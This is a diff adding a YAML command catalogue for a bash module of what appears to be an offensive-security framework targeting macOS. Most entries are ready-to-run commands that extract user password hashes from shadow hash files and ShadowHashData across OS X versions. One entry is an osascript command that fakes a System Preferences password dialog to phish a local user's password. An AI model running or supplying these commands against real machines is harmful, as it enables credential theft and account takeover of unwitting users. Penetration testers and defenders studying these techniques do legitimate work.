@@ -1,0 +1,49 @@
+---
+name: bash
+description: Common default command shell
+os: macOS
+ptf_module: null
+---
+commands:
+  - "Manual macOS Hash Extraction, OS X 10.5-10.7":
+    - type: ["bash","autonomous"]
+    - text:
+      - "dscl localhost -read /Search/Users/{STR} | grep GeneratedUID | cut -c15-"
+      - "cat /var/db/shadow/hash/{STR} | cut -c169-216 > {FILE}"
+    - input: ["target user","GUID","output hash file"]
+    - output: ["STDOUT",{"FILE":{"input":3}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Manual macOS Hash Extraction, OS X 10.8-10.13":
+    - type: ["bash","autonomous"]
+    - text:
+      - "defaults read /var/db/dslocal/nodes/Default/users/{STR}.plist"
+      - "ShadowHashData | tr -dc '0-9a-f' | xxd -p -r | plutil -convert xml1 - -o -"
+    - input: ["target user"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "macOS Hash Extraction using Directory Service Utility, OS X 10.8-10.13":
+    - type: ["bash","standalone"]
+    - text:
+      - "dscl . read /Users/{STR} AuthenticationAuthority"
+      - "dscl . read /Users/{STR} dsAttrTypeNative:ShadowHashData"
+    - input: ["target user","target user (repeat)"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Local macOS Phishing via Apple Script Password Prompt":
+    - type: ["bash","standalone"]
+    - text: "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"{STR}\" & return & return default answer \"\" with icon 1 with hidden answer with title \"{STR}\"'"
+    - input: ["dialogue display message","answer title"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Exit bash":
+    - type: ["bash","interactive"]
+    - text: "exit"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"bash"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+...
